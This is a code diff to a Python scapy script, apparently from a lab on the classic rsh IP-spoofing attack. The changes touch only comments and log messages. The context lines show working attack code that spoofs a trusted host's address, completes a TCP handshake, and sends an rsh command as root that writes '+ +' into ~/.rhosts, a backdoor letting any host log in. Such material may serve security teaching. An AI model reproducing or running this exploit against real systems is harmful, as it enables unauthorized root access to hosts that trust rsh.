@@ -80,7 +80,7 @@ def rsh_attack(target_ip: str, trusted_ip: str, ifname: str) -> None:
     # Base IP packet with spoofed source IP
     ip_packet = inet.IP(src=trusted_ip, dst=target_ip)
 
-    # --- THREE-WAY HANDSHAKE
+    # --- First three-way handshake
     seq = 1000
     logger.info('Initiating TCP three-way handshake...')
     syn_packet = inet.TCP(sport=FIRST_SRC_PORT,
@@ -99,7 +99,7 @@ def rsh_attack(target_ip: str, trusted_ip: str, ifname: str) -> None:
     sc.send(ip_packet / ack_packet, verbose=0)
     logger.info('Done')
 
-    # --- RSH - Send backdoor
+    # --- Send backdoor
     logger.info('Sending backdoor...')
     backdoor = 'echo "+ +" > ~/.rhosts'
     data = f'{SECOND_SRC_PORT}\x00root\x00root\x00{backdoor}\x00'
@@ -111,8 +111,8 @@ def rsh_attack(target_ip: str, trusted_ip: str, ifname: str) -> None:
     res = sc.sr1(ip_packet / tcp_packet / data, verbose=0)
     logger.info('Done')
 
-    # --- RSH - Second connection's three-way handshake
-    logger.info('Accepting second three-way handshake')
+    # --- Second connection's three-way handshake
+    logger.info('Accepting second three-way handshake...')
     res = sc.sniff(iface=ifname, filter=f'tcp and host {target_ip}',
                    count=1)[0]
 
